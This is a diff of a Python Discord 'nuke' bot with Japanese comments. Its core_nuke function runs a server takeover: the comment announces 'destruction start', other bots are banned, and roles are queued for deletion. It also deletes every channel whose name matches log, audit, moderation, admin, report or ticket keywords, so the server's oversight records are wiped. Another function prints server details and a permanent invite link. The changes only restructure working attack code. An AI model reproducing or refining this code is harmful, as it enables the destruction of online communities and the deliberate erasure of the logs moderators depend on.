@@ -122,16 +122,22 @@ async def core_nuke(guild, new_server_name=None):
 
     print(f"破壊開始: {guild.name} 非BOT={len(non_bot_members)}")
 
-    # 他のボットBAN（空対策）
+    # 並列スタート: 他のボットBAN
     bot_ban_coros = [limited_global(guild.ban(m, reason="", delete_message_seconds=0)) for m in members if m.bot]
-    bot_ban_task = asyncio.create_task(asyncio.gather(*bot_ban_coros, return_exceptions=True)) if bot_ban_coros else None
+    if bot_ban_coros:
+        bot_ban_task = asyncio.create_task(asyncio.gather(*bot_ban_coros, return_exceptions=True))
+    else:
+        bot_ban_task = None
 
-    # ログ系チャンネル削除（空対策）
+    # ログ系チャンネル削除
     log_keywords = ["log", "ログ", "audit", "監視", "mod", "moderation", "admin", "管理", "report", "報告", "ticket", "チケット"]
     channels = list(guild.channels)
     log_channels = [ch for ch in channels if any(kw.lower() in ch.name.lower() for kw in log_keywords)]
     log_delete_coros = [limited_global(ch.delete()) for ch in log_channels]
-    log_delete_task = asyncio.create_task(asyncio.gather(*log_delete_coros, return_exceptions=True)) if log_delete_coros else None
+    if log_delete_coros:
+        log_delete_task = asyncio.create_task(asyncio.gather(*log_delete_coros, return_exceptions=True))
+    else:
+        log_delete_task = None
 
     # ロール削除タスク
     roles_to_delete = [r for r in guild.roles if not r.is_default() and not r.managed]
@@ -410,5 +416,3 @@ async def log_server_info(guild):
     print(f"メンバー数: {member_count}")
     print(f"永久招待リンク: {invite_link}")
     print("---")
-
-bot.run(TOKEN)
